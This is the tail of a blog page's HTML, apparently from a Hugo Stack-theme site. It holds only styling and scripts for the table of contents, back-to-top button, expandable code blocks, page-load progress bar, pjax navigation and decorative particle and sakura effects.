    #TableOfContents > ul ol,
    #TableOfContents > ol ul,
    #TableOfContents > ol ol {
        display: none;
    }
    #TableOfContents > ul .open,
    #TableOfContents > ol .open {
        display: block;
    }
</style>

<script>
    function initTocHide() {
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        window.addEventListener('scroll', function() {
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                const parent = ul.parentElement;
                ul = parent ? parent.parentElement : null;
            } while (ul && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>


<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://expl0rer.top/icons/backTop.svg);
    }
</style>

<script>
    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        window.addEventListener('scroll', function() {
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        });
    }

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<style>
    .highlight {
        max-height: 400px;
        overflow: hidden;
    }

    .code-show {
        max-height: none !important;
    }

    .code-more-box {
        width: 100%;
        padding-top: 78px;
        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 1;
    }

    .code-more-btn {
        display: block;
        margin: auto;
        width: 44px;
        height: 22px;
        background: #f0f0f5;
        border-top-left-radius: 8px;
        border-top-right-radius: 8px;
        padding-top: 6px;
        cursor: pointer;
    }

    .code-more-img {
        cursor: pointer !important;
        display: block;
        margin: auto;
        width: 22px;
        height: 16px;
    }
</style>

<script>
  function initCodeMoreBox() {
    let codeBlocks = document.querySelectorAll(".highlight");
    if (!codeBlocks) {
      return;
    }
    codeBlocks.forEach(codeBlock => {
      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
        return;
      }
      let codeMoreBox = document.createElement('div');
      codeMoreBox.classList.add('code-more-box');
      let codeMoreBtn = document.createElement('span');
      codeMoreBtn.classList.add('code-more-btn');
      codeMoreBtn.addEventListener('click', () => {
        codeBlock.classList.add('code-show');
        codeMoreBox.style.display = 'none';
        window.dispatchEvent(new Event('resize'))
      })
      let img = document.createElement('img');
      img.classList.add('code-more-img');
      img.src = "https:\/\/expl0rer.top\/icons\/codeMore.png"
      codeMoreBtn.appendChild(img);
      codeMoreBox.appendChild(codeMoreBtn);
      codeBlock.appendChild(codeMoreBox)
    })
  }
  
  initCodeMoreBox();
</script>






<script>
    function showHideView() {
        let viewCounts = document.querySelectorAll("#viewCount");
        if (viewCounts) {
            let article =  document.querySelector(".article-page");
            if (!article) {
                viewCounts.forEach(ele => {
                    ele.style.display = 'none';
                });
            }
        }
    }
    
    showHideView();
</script>

<script src="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css" crossorigin="anonymous" />
<script>
    NProgress.start();
    document.addEventListener("readystatechange", () => {
        if (document.readyState === "interactive") NProgress.inc(0.8);
        if (document.readyState === "complete") NProgress.done();
    });
</script>


<script>
    var pjax = new pjax({
        selectors: [
            ".main-container"
        ]
    })

</script>

<script>
    pjax._handleResponse = pjax.handleResponse;
    pjax.handleResponse = function(responseText, request, href, options) {
        if (request.responseText.match("<html")) {
            if (responseText) {
                let newDom = new DOMParser().parseFromString(responseText, 'text/html');
                let bodyClass = newDom.body.className;
                document.body.setAttribute("class", bodyClass)
            }
            pjax._handleResponse(responseText, request, href, options);
        } else {
        }
    }
</script>



<script>
    document.addEventListener('pjax:complete', () => {
        if (window.Stack && typeof window.Stack.init === 'function') {
            window.Stack.init();
        }
    })
</script>

<div id="particles-js"></div>

<script src="https://expl0rer.top/background/particles.min.js"></script>
<script>
  particlesJS.load('particles-js', "https:\/\/expl0rer.top\/background\/particlesjs-config.json", function() {
    console.log('particles.js loaded - callback');
  });
</script>

<style>
  #particles-js {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: -1;
  }
</style>


<script src="https://expl0rer.top/background/sakura.js"></script>

    </body>
</html>
